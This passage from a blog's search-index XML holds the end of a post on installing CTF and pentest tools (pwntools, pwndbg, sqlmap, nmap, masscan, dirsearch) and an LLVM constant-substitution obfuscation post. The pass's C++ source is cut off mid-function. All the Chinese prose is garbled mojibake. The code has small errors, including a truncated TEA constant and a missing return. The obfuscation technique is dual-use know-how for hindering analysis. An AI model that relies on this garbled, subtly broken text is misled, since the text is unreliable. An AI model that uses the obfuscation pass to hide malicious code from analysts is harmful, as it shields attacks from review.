prompt_">#</span><span class="language-bash">setuptools 36.6.1 -&gt; python2</span></span><br><span class="line">wget https://files.pythonhosted.org/packages/a4/c8/9a7a47f683d54d83f648d37c3e180317f80dc126a304c45dc6663246233a/setuptools-36.5.0.zip</span><br><span class="line">unzip setuptools-36.5.0.zip</span><br><span class="line">cd setuptools-36.5.0</span><br><span class="line">sudo python2 setup.py install</span><br><span class="line">cd ../</span><br><span class="line">sudo rm -rf setuptools-36.5.0 setuptools-36.5.0.zip</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">setuptools 65.4.1 -&gt; python3</span></span><br><span class="line">sudo apt-get install python3-setuptools</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">pip</span></span><br><span class="line">wget https://mirrors.aliyun.com/pypi/packages/53/7f/55721ad0501a9076dbc354cc8c63ffc2d6f1ef360f49ad0fbcce19d68538/pip-20.3.4.tar.gz</span><br><span class="line">tar -zxvf pip-20.3.4.tar.gz</span><br><span class="line">cd pip-20.3.4</span><br><span class="line">sudo python2 setup.py install</span><br><span class="line">sudo python3 setup.py install</span><br><span class="line">cd ../</span><br><span class="line">sudo rm -rf pip-20.3.4 pip-20.3.4.tar.gz</span><br><span class="line"></span><br><span class="line">sudo pip2 config set global.index-url https://mirrors.aliyun.com/pypi/simple</span><br><span class="line">sudo pip3 config set global.index-url https://mirrors.aliyun.com/pypi/simple</span><br><span class="line"></span><br><span class="line">sudo python2 -m pip install --upgrade pip</span><br><span class="line">sudo python3 -m pip install --upgrade pip</span><br><span class="line"></span><br><span class="line">sudo pip2 install pathlib2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">pwntools 4.7.0</span></span><br><span class="line">sudo pip2 install pwntools==4.7.0</span><br><span class="line">sudo pip3 install pwntools==4.7.0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">pwndbg</span></span><br><span class="line">git clone https://github.com/pwndbg/pwndbg.git</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br><span class="line">cd ../</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Pwngdb</span></span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git</span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br><span class="line">sed -i &#x27;N;2 i source ~/pwndbg/gdbinit.py&#x27; ~/.gdbinit</span><br><span class="line">sed -i &#x27;/peda/d&#x27; ~/.gdbinit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">one_gadget</span></span><br><span class="line">sudo apt-get -y install ruby-dev</span><br><span class="line">sudo gem install one_gadget</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">seccomp-tools</span></span><br><span class="line">sudo gem install seccomp-tools</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">patchelf</span></span><br><span class="line">sudo apt-get -y install patchelf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">glibc-all-in-one</span></span><br><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">ln</span> python2 -&gt; python</span></span><br><span class="line">sudo ln -s /usr/bin/python2 /usr/bin/python</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ropper</span></span><br><span class="line">sudo pip3 install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">qemu-system</span></span><br><span class="line">sudo apt-get -y install qemu-system</span><br></pre></td></tr></table></figure><p>docker çš„ä¹Ÿæ­äº†ä¸€å¥—ï¼Œæ„Ÿè§‰è¿˜è¡Œï¼Œé…åˆç€ç”¨ã€‚</p><p>å‚è€ƒæ•™ç¨‹ï¼š<a href="https://blog.csdn.net/qq_25755011/article/details/115541221">https://blog.csdn.net/qq_25755011/article/details/115541221</a></p><p>é…ç½®ï¼šm1 mac miniï¼Œ16g è¿å­˜ï¼Œ512g ç¡¬ç›˜ï¼ŒVentura 13.3</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230405233516740.png" alt="image-20230405233516740"></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sql æ³¨å…¥ä¸€æŠŠæ¢­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install sqlmap</span><br></pre></td></tr></table></figure><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>æ‰«æœºå­ç­‰ç­‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install nmap</span><br></pre></td></tr></table></figure><h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h2><p>æ‰«ç«¯å£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install masscan</span><br></pre></td></tr></table></figure><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>æ–‡ä»¶åˆ†æï¼Œä¹Ÿå°±æ‰“ ctf æ‹¿å‡ºæ¥ç”¨ç”¨ï¼Œè§£éšå†™é¢˜.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install binwalk</span><br></pre></td></tr></table></figure><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>æ‰«ç›®å½•çš„ï¼Œå®˜ç½‘ï¼š<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /Documents/sec</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/maurosoria/dirsearch.git</span><br><span class="line"><span class="comment"># åˆ›å»ºè½¯é“¾æ¥</span></span><br><span class="line">sudo <span class="built_in">ln</span> -s /Users/c1everf0x/Documents/sec/dirsearch/dirsearch.py /usr/local/bin/dirsearch</span><br></pre></td></tr></table></figure><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>æµé‡åˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install --cask wireshark</span><br></pre></td></tr></table></figure><h2 id="010editor"><a href="#010editor" class="headerlink" title="010editor"></a>010editor</h2><p>çœ‹äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><blockquote><p>æ¯ä¸€è¡Œéƒ½æ˜¯å®Œæ•´çš„ url é“¾æ¥</p></blockquote><p><a href="https://www.sqlsec.com/2022/01/monterey.html">https://www.sqlsec.com/2022/01/monterey.html</a></p><p><a href="https://cn-sec.com/archives/1620371.html">https://cn-sec.com/archives/1620371.html</a></p><p><a href="https://wangze.tech/environment/#%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6">https://wangze.tech/environment/#å…¶ä»–è½¯ä»¶</a></p><p><a href="http://mirrors.ustc.edu.cn/help/brew.git.html">http://mirrors.ustc.edu.cn/help/brew.git.html</a></p><p><a href="https://www.jianshu.com/p/7421f7a03e07">https://www.jianshu.com/p/7421f7a03e07</a></p><p><a href="https://ihtcboy.com/2018/09/30/2018-09-30_%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84macOS%E7%B3%BB%E5%88%97%EF%BC%9AMac%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">https://ihtcboy.com/2018/09/30/2018-09-30_ç¨‹åºå‘˜çš„macOSç³»åˆ—ï¼šMacå¼€å‘ç¯å¢ƒé…ç½®/</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Macos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¥½å¥½å¥½ï¼ˆä¸€ï¼‰</title>
      <link href="/posts/39758/"/>
      <url>/posts/39758/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>408ï¼šæ•°æ®ç»“æ„å¤ä¹ ï¼ˆä¸€ï¼‰</title>
      <link href="/posts/61353/"/>
      <url>/posts/61353/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>llvmä»£ç æ··æ·†å­¦ä¹ ï¼ˆä¹ï¼‰</title>
      <link href="/posts/32479/"/>
      <url>/posts/32479/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>éšä¾¿å­¦å­¦ llvm ä»£ç æ··æ·†ï¼Œé¡ºä¾¿åšä¸ªæ¯•è®¾ï¼Œæ°´å‡ ç¯‡æ–‡ç« å°±å½“åšåšç¬”è®°</p></blockquote><h1 id="å¸¸é‡æ›¿ä»£åŸç†åˆ†æ"><a href="#å¸¸é‡æ›¿ä»£åŸç†åˆ†æ" class="headerlink" title="å¸¸é‡æ›¿ä»£åŸç†åˆ†æ"></a>å¸¸é‡æ›¿ä»£åŸç†åˆ†æ</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>å¸¸é‡æ›¿ä»£æŒ‡çš„æ˜¯å°†äºŒå…ƒè¿ç®—æŒ‡ä»¤ï¼ˆå¦‚åŠ æ³•ã€å‡æ³•ã€å¼‚æˆ–ç­‰ç­‰ï¼‰ä¸­ä½¿ç”¨çš„å¸¸æ•°ï¼Œæ›¿æ¢ä¸ºç­‰æ•ˆè€Œæ›´å¤æ‚çš„è¡¨è¾¾å¼ï¼Œä»¥è¾¾åˆ°æ··æ·†è®¡ç®—è¿‡ç¨‹æˆ–æŸäº›ç‰¹æ®Šå¸¸é‡çš„ç›®çš„ã€‚</p><p>ä¾‹ï¼šå°† TEA åŠ å¯†ä¸­ä½¿ç”¨çš„å¸¸é‡ <code>0x9e3779b</code> æ›¿æ¢ä¸º<code>12167 * 16715 + 18858 * 32146 - 643678438</code>ã€‚</p><p>åŒæŒ‡ä»¤æ›¿ä»£ï¼Œç›®å‰ä»…æ”¯æŒæ•´æ•°å¸¸é‡çš„æ›¿æ¢ï¼Œå› ä¸ºæ›¿æ¢æµ®ç‚¹æ•°ä¼šé€ æˆèˆå…¥çš„é”™è¯¯å’Œè¯¯å·®ã€‚ä¸”ä»…æ”¯æŒ 32 ä½æ•´æ•°çš„æ›¿æ¢ã€‚</p><h2 id="æ··æ·†æ•ˆæœ"><a href="#æ··æ·†æ•ˆæœ" class="headerlink" title="æ··æ·†æ•ˆæœ"></a>æ··æ·†æ•ˆæœ</h2><p>ç±»ä¼¼äºæŒ‡ä»¤æ›¿ä»£ï¼Œå‡½æ•°çš„æ§åˆ¶æµæ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œä½†æ˜¯è¿ç®—è¿‡ç¨‹å˜å¾—éš¾ä»¥åˆ†æï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230301142847017.png" alt="image-20230301142847017"></p><h2 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h2><p>å¸¸é‡æ›¿ä»£å¯è¿›ä¸€æ­¥æ‰©å±•ä¸ºå¸¸é‡æ•°ç»„çš„æ›¿ä»£å’Œå­—ç¬¦ä¸²æ›¿ä»£ã€‚</p><p>å¸¸é‡æ•°ç»„æ›¿ä»£å¯ä»¥æŠ¹å» AESï¼ŒDES ç­‰åŠ å¯†ç®—æ³•ä¸­çš„ç‰¹å¾æ•°ç»„ï¼Œå­—ç¬¦ä¸²æ›¿ä»£å¯ä»¥é˜²æ­¢æ”»å‡»è€…é€šè¿‡å­—ç¬¦ä¸²å®šä½å…³é”®ä»£ç ã€‚</p><h1 id="å¸¸é‡æ›¿ä»£ä»£ç å®ç°æ€è·¯"><a href="#å¸¸é‡æ›¿ä»£ä»£ç å®ç°æ€è·¯" class="headerlink" title="å¸¸é‡æ›¿ä»£ä»£ç å®ç°æ€è·¯"></a>å¸¸é‡æ›¿ä»£ä»£ç å®ç°æ€è·¯</h1><h2 id="å®ç°æ­¥éª¤"><a href="#å®ç°æ­¥éª¤" class="headerlink" title="å®ç°æ­¥éª¤"></a>å®ç°æ­¥éª¤</h2><h3 id="æ€»ä½“æ€è·¯"><a href="#æ€»ä½“æ€è·¯" class="headerlink" title="æ€»ä½“æ€è·¯"></a>æ€»ä½“æ€è·¯</h3><p>æ‰«ææ‰€æœ‰æŒ‡ä»¤ï¼Œå¯¹ç›®æ ‡æŒ‡ä»¤ï¼ˆæ“ä½œæ•°ç±»å‹ä¸º 32 ä½æ•´æ•°ï¼‰è¿›è¡Œæ›¿æ¢ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Instruction *I : origInst)&#123;</span><br><span class="line">    <span class="comment">// åªå¯¹äºŒå…ƒè¿ç®—æŒ‡ä»¤ä¸­çš„å¸¸é‡è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">    <span class="keyword">if</span>(BinaryOperator *BI = <span class="built_in">dyn_cast</span>&lt;BinaryOperator&gt;(I))&#123;</span><br><span class="line">        <span class="comment">// ä»…å¯¹æ•´æ•°è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">        <span class="keyword">if</span>(BI-&gt;<span class="built_in">getType</span>()-&gt;<span class="built_in">isIntegerTy</span>(<span class="number">32</span>))&#123;</span><br><span class="line">            <span class="built_in">substitute</span>(BI);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ›¿æ¢æ–¹æ¡ˆ"><a href="#æ›¿æ¢æ–¹æ¡ˆ" class="headerlink" title="æ›¿æ¢æ–¹æ¡ˆ"></a>æ›¿æ¢æ–¹æ¡ˆ</h3><ul><li>çº¿æ€§æ›¿æ¢ï¼š<code>val -&gt; ax + by + c</code>ï¼Œå…¶ä¸­ <code>val</code> ä¸ºåŸå¸¸é‡ <code>a</code>ï¼Œ<code>b</code>ä¸ºéšæœºå¸¸é‡ <code>x</code>ï¼Œ<code>y</code>ä¸ºéšæœºå…¨å±€å˜é‡ï¼Œ<code>c = val - (ax + by)</code></li><li>æŒ‰ä½è¿ç®—æ›¿æ¢ï¼š<code>val -&gt; (x &lt;&lt; 5 | y &gt;&gt; 3) ^ c</code>ï¼Œå…¶ä¸­<code>val</code>ä¸ºåŸå¸¸é‡<code>x</code>ï¼Œ<code>y</code>ä¸ºéšæœºå…¨å±€å˜é‡ï¼Œ<code>c = val ^ (x &lt;&lt; 5 | y &gt;&gt; 3)</code></li></ul><h1 id="å¸¸é‡æ›¿ä»£ä»£ç å®ç°"><a href="#å¸¸é‡æ›¿ä»£ä»£ç å®ç°" class="headerlink" title="å¸¸é‡æ›¿ä»£ä»£ç å®ç°"></a>å¸¸é‡æ›¿ä»£ä»£ç å®ç°</h1><h2 id="ConstantSubstitution-cpp"><a href="#ConstantSubstitution-cpp" class="headerlink" title="ConstantSubstitution.cpp"></a>ConstantSubstitution.cpp</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/CommandLine.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Utils.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_RAND 32767</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUMBER_CONST_SUBST 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ··æ·†æ¬¡æ•°ï¼Œæ··æ·†æ¬¡æ•°è¶Šå¤šæ··æ·†ç»“æœè¶Šå¤æ‚</span></span><br><span class="line"><span class="function"><span class="type">static</span> cl::opt&lt;<span class="type">int</span>&gt; <span class="title">obfuTimes</span><span class="params">(<span class="string">&quot;csub_loop&quot;</span>, cl::init(<span class="number">1</span>), cl::desc(<span class="string">&quot;Obfuscate a function &lt;obfu_time&gt; time(s).&quot;</span>))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ConstantSubstitution</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">            <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">ConstantSubstitution</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;</span><br><span class="line">                <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¯¹å•ä¸ªæŒ‡ä»¤ BI è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">substitute</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// çº¿æ€§æ›¿æ¢ï¼šval -&gt; ax + by + c</span></span><br><span class="line">            <span class="comment">// å…¶ä¸­ val ä¸ºåŸå¸¸é‡ a, b ä¸ºéšæœºå¸¸é‡ x, y ä¸ºéšæœºå…¨å±€å˜é‡ c = val - (ax + by)</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">linearSubstitute</span><span class="params">(BinaryOperator *BI, <span class="type">int</span> i)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æŒ‰ä½è¿ç®—æ›¿æ¢ï¼šval -&gt; (x &lt;&lt; 5 | y &gt;&gt; 3) ^ c</span></span><br><span class="line">            <span class="comment">// å…¶ä¸­ val ä¸ºåŸå¸¸é‡x, y ä¸ºéšæœºå…¨å±€å˜é‡ c = val ^ (x &lt;&lt; 5 | y &gt;&gt; 3)</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">bitwiseSubstitute</span><span class="params">(BinaryOperator *BI, <span class="type">int</span> i)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ConstantSubstitution::runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    <span class="built_in">INIT_CONTEXT</span>(F);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; obfuTimes;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">            vector&lt;Instruction*&gt; origInst;</span><br><span class="line">            <span class="keyword">for</span>(Instruction &amp;I : BB)&#123;</span><br><span class="line">                origInst.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(Instruction *I : origInst)&#123;</span><br><span class="line">                <span class="comment">// åªå¯¹äºŒå…ƒè¿ç®—æŒ‡ä»¤ä¸­çš„å¸¸é‡è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">                <span class="keyword">if</span>(BinaryOperator *BI = <span class="built_in">dyn_cast</span>&lt;BinaryOperator&gt;(I))&#123;</span><br><span class="line">                    <span class="comment">// ä»…å¯¹æ•´æ•°è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">                    <span class="keyword">if</span>(BI-&gt;<span class="built_in">getType</span>()-&gt;<span class="built_in">isIntegerTy</span>(<span class="number">32</span>))&#123;</span><br><span class="line">                        <span class="built_in">substitute</span>(BI);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ConstantSubstitution::linearSubstitute</span><span class="params">(BinaryOperator *BI, <span class="type">int</span> i)</span></span>&#123;</span><br><span class="line">    Module &amp;M = *BI-&gt;<span class="built_in">getModule</span>();</span><br><span class="line">    ConstantInt *val = <span class="built_in">cast</span>&lt;ConstantInt&gt;(BI-&gt;<span class="built_in">getOperand</span>(i));</span><br><span class="line">    <span class="comment">// éšæœºç”Ÿæˆ x, y, a, b</span></span><br><span class="line">    <span class="comment">// MAX_RAND é˜²æ­¢æº¢å‡º</span></span><br><span class="line">    <span class="type">int</span> randX = <span class="built_in">rand</span>() % MAX_RAND, randY = <span class="built_in">rand</span>() % MAX_RAND;</span><br><span class="line">    <span class="type">int</span> randA = <span class="built_in">rand</span>() % MAX_RAND, randB = <span class="built_in">rand</span>() % MAX_RAND;</span><br><span class="line">    <span class="comment">// è®¡ç®— c = val - (ax + by)</span></span><br><span class="line">    <span class="comment">// val-&gt;getValue()è·å–åˆ°çš„å€¼æ˜¯ APInt ç±»å‹</span></span><br><span class="line">    APInt c = val-&gt;<span class="built_in">getValue</span>() - (randA * randX + randB * randY);</span><br><span class="line">    ConstantInt *constX = <span class="built_in">CONST</span>(val-&gt;<span class="built_in">getType</span>(), randX);</span><br><span class="line">    ConstantInt *constY = <span class="built_in">CONST</span>(val-&gt;<span class="built_in">getType</span>(), randY);</span><br><span class="line">    ConstantInt *constA = <span class="built_in">CONST</span>(val-&gt;<span class="built_in">getType</span>(), randA);</span><br><span class="line">    ConstantInt *constB = <span class="built_in">CONST</span>(val-&gt;<span class="built_in">getType</span>(), randB);</span><br><span class="line">    ConstantInt *constC = (ConstantInt*)<span class="built_in">CONST</span>(val-&gt;<span class="built_in">getType</span>(), c);</span><br><span class="line">    <span class="comment">// åˆ›å»ºå…¨å±€å˜é‡ x, y</span></span><br><span class="line">    <span class="comment">// PrivateLinkage åªèƒ½åœ¨æ¨¡å—å†…ç”Ÿæ•ˆï¼Œç§æœ‰é“¾æ¥</span></span><br><span class="line">    GlobalVariable *x = <span class="keyword">new</span> <span class="built_in">GlobalVariable</span>(M, val-&gt;<span class="built_in">getType</span>(), <span class="literal">false</span>, GlobalValue::PrivateLinkage, constX, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">    GlobalVariable *y = <span class="keyword">new</span> <span class="built_in">GlobalVariable</span>(M, val-&gt;<span class="built_in">getType</span>(), <span class="literal">false</span>, GlobalValue::PrivateLinkage, constY, <span class="string">&quot;y&quot;</span>);</span><br><span class="line">    LoadInst *opX = <span class="keyword">new</span> <span class="built_in">LoadInst</span>(val-&gt;<span class="built_in">getType</span>(), x, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    LoadInst *opY = <span class="keyword">new</span> <span class="built_in">LoadInst</span>(val-&gt;<span class="built_in">getType</span>(), y, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// æ„é€  op = ax + by + c è¡¨è¾¾å¼</span></span><br><span class="line">    BinaryOperator *op1 = BinaryOperator::<span class="built_in">CreateMul</span>(opX, constA, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BinaryOperator *op2 = BinaryOperator::<span class="built_in">CreateMul</span>(opY, constB, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BinaryOperator *op3 = BinaryOperator::<span class="built_in">CreateAdd</span>(op1, op2, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BinaryOperator *op4 = BinaryOperator::<span class="built_in">CreateAdd</span>(op3, constC, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ç”¨è¡¨è¾¾å¼ ax + by + c æ›¿æ¢åŸå¸¸é‡æ“ä½œæ•°</span></span><br><span class="line">    BI-&gt;<span class="built_in">setOperand</span>(i, op4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ConstantSubstitution::bitwiseSubstitute</span><span class="params">(BinaryOperator *BI, <span class="type">int</span> i)</span></span>&#123;</span><br><span class="line">    Module &amp;M = *BI-&gt;<span class="built_in">getModule</span>();</span><br><span class="line">    ConstantInt *val = <span class="built_in">cast</span>&lt;ConstantInt&gt;(BI-&gt;<span class="built_in">getOperand</span>(i));</span><br><span class="line">    <span class="comment">// éšæœºç”Ÿæˆ x, 